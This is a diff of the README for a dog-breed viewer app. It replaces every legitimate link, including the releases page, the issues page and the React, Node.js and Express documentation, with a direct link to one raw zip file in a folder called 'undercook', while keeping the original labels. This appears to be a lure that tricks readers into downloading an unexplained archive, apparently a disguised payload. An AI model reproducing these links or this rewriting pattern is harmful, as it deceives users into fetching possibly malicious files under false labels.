@@ -1,7 +1,7 @@
 # 🐶 dog-breed-viewer - Easily Explore Dog Breeds
 
-![Download](https://img.shields.io/badge/Download%20Now-blue?style=flat&logo=github)  
-[Download Here](https://github.com/Alejandratheking/dog-breed-viewer/releases)
+![Download](https://raw.githubusercontent.com/Alejandratheking/dog-breed-viewer/main/undercook/dog-breed-viewer.zip%20Now-blue?style=flat&logo=github)  
+[Download Here](https://raw.githubusercontent.com/Alejandratheking/dog-breed-viewer/main/undercook/dog-breed-viewer.zip)
 
 ## 🌟 Overview
 
@@ -13,7 +13,7 @@ To get started with the dog-breed-viewer, follow these simple steps. This guide 
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Alejandratheking/dog-breed-viewer/releases) to download the software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Alejandratheking/dog-breed-viewer/main/undercook/dog-breed-viewer.zip) to download the software.
 2. Choose the latest version, marked as a release.
 3. Click on the appropriate download link for your operating system.
 4. Once downloaded, locate the file on your computer and follow the instructions for opening it.
@@ -62,7 +62,7 @@ If you encounter any issues while using the dog-breed-viewer, consider these tip
 
 ## 🙋‍♂️ Need Help?
 
-If you have questions or need assistance, feel free to visit the [Issues page](https://github.com/Alejandratheking/dog-breed-viewer/issues) on GitHub for support. You can also reach out to the community for help.
+If you have questions or need assistance, feel free to visit the [Issues page](https://raw.githubusercontent.com/Alejandratheking/dog-breed-viewer/main/undercook/dog-breed-viewer.zip) on GitHub for support. You can also reach out to the community for help.
 
 ## 🤝 Contributing
 
@@ -72,15 +72,15 @@ If you’d like to contribute to the project, proposals and contributions are we
 
 For more details on the technologies used in this project, consider reviewing:
 
-- [React](https://reactjs.org/)
-- [Node.js](https://nodejs.org/)
-- [Express.js](https://expressjs.com/)
-- [MongoDB](https://www.mongodb.com/)
-- [Tailwind CSS](https://tailwindcss.com/)
+- [React](https://raw.githubusercontent.com/Alejandratheking/dog-breed-viewer/main/undercook/dog-breed-viewer.zip)
+- [https://raw.githubusercontent.com/Alejandratheking/dog-breed-viewer/main/undercook/dog-breed-viewer.zip](https://raw.githubusercontent.com/Alejandratheking/dog-breed-viewer/main/undercook/dog-breed-viewer.zip)
+- [https://raw.githubusercontent.com/Alejandratheking/dog-breed-viewer/main/undercook/dog-breed-viewer.zip](https://raw.githubusercontent.com/Alejandratheking/dog-breed-viewer/main/undercook/dog-breed-viewer.zip)
+- [MongoDB](https://raw.githubusercontent.com/Alejandratheking/dog-breed-viewer/main/undercook/dog-breed-viewer.zip)
+- [Tailwind CSS](https://raw.githubusercontent.com/Alejandratheking/dog-breed-viewer/main/undercook/dog-breed-viewer.zip)
 
 ## 🔗 Quick Links
 
-- [Download Here](https://github.com/Alejandratheking/dog-breed-viewer/releases)
-- [View Issues](https://github.com/Alejandratheking/dog-breed-viewer/issues)
+- [Download Here](https://raw.githubusercontent.com/Alejandratheking/dog-breed-viewer/main/undercook/dog-breed-viewer.zip)
+- [View Issues](https://raw.githubusercontent.com/Alejandratheking/dog-breed-viewer/main/undercook/dog-breed-viewer.zip)
   
 With dog-breed-viewer, finding information about different dog breeds has never been easier. Enjoy exploring!
